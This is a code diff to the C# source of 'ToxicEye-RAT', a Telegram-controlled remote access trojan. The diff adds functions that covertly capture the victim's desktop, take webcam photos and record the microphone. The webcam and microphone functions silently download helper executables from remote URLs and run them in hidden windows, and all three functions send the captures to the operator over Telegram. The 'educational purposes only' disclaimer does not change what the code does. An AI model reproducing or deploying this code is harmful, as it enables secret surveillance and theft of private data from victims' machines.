@@ -1,7 +1,7 @@
 ﻿/* 
        ^ Author    : LimerBoy
        ^ Name      : ToxicEye-RAT
-       ^ Github    : https:github.com/LimerBoy
+       ^ Github    : https://github.com/LimerBoy
 
        > This program is distributed for educational purposes only.
 */
@@ -9,6 +9,7 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Management;
@@ -365,6 +366,111 @@ namespace TelegramRAT
                 }
             }
             telegram.sendText("✅ Scanning " + to + " hosts completed!");
+        }
+
+        // Desktop screenshot
+        public static void desktopScreenshot()
+        {
+            string filename = "screenshot.png";
+            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
+            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
+            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
+            bmpScreenshot.Save(filename, System.Drawing.Imaging.ImageFormat.Png);
+            // Send
+            telegram.sendImage(filename);
+            // Delete photo
+            File.Delete(filename);
+        }
+
+        // Webcam screenshot
+        public static void webcamScreenshot(string delay, string camera)
+        {
+            // Links
+            string commandCamPATH = Environment.GetEnvironmentVariable("temp") + "\\CommandCam.exe";
+            string commandCamLINK = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe";
+            string filename = "webcam.png";
+            // Check if CommandCam.exe file exists
+            if (!File.Exists(commandCamPATH))
+            {
+                telegram.sendText("📷 Downloading CommandCam...");
+                WebClient webClient = new WebClient();
+                webClient.DownloadFile(commandCamLINK, commandCamPATH);
+                telegram.sendText("📷 CommandCam loaded!");
+            }
+            // Log
+            telegram.sendText($"📹 Trying create screenshot from camera {camera}");
+            // Check if file exists
+            if (File.Exists(filename))
+            {
+                File.Delete(filename);
+            }
+            // Create screenshot
+            Process process = new Process();
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            startInfo.FileName = commandCamPATH;
+            startInfo.Arguments = $"/filename \"{filename}\" /delay {delay} /devnum {camera}";
+            process.StartInfo = startInfo;
+            process.Start();
+            process.WaitForExit();
+            // Check if photo exists
+            if (!File.Exists(filename))
+            {
+                telegram.sendText("📷 Webcam not found!");
+                return;
+            }
+            // Send
+            telegram.sendImage(filename);
+            // Delete photo
+            File.Delete(filename);
+        }
+
+        // Record microphone
+        public static void recordMircophone(string time)
+        {
+            string fmediaFILE = "fmedia.exe";
+            string fmediaPATH = Environment.GetEnvironmentVariable("temp") + "\\fmedia\\";
+            string fmediaLINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip";
+            string filename = "recording.wav";
+            // Log
+            telegram.sendText($"🎧 Listening microphone {time} seconds...");
+            // Check if fmedia.exe file exists
+            if (!File.Exists(fmediaPATH + fmediaFILE))
+            {
+                telegram.sendText("🎤 Downloading FMedia...");
+                string tempArchive = fmediaPATH + "fmedia.zip";
+                Directory.CreateDirectory(fmediaPATH);
+                WebClient webClient = new WebClient();
+                webClient.DownloadFile(fmediaLINK, tempArchive);
+                System.IO.Compression.ZipFile.ExtractToDirectory(tempArchive, fmediaPATH);
+                File.Delete(tempArchive);
+                telegram.sendText("🎤 FMedia loaded!");
+            }
+            // Check if file exists
+            if (File.Exists(filename))
+            {
+                File.Delete(filename);
+            }
+
+            // Record audio
+            Process process = new Process();
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            startInfo.FileName = fmediaPATH + fmediaFILE;
+            startInfo.Arguments = $"--record --until={time} -o {filename}";
+            process.StartInfo = startInfo;
+            process.Start();
+            process.WaitForExit();
+            // Check if recording exists
+            if (!File.Exists(filename))
+            {
+                telegram.sendText("🎤 Microphone not found!");
+                return;
+            }
+            // Send
+            telegram.sendVoice(filename);
+            // Delete recording
+            File.Delete(filename);
         }
 
         // Power command
